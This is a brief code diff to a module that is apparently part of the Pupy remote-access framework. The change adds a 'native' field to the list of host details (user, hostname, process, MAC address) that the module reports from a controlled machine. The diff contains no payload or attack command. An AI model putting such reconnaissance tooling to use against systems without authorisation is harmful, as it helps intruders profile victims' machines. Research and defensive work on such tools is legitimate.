@@ -25,7 +25,7 @@ class GetInfo(PupyModule):
             "hostname", "user", "release", "version",
             "os_arch", "proc_arch", "pid", "exec_path", "cid",
             "address", "macaddr", "spi", "revision", "node",
-            "debug_logfile"
+            "debug_logfile", "native"
         ]
         pupyKeys = ["transport", "launcher", "launcher_args"]
         windKeys = ["uac_lvl","intgty_lvl"]
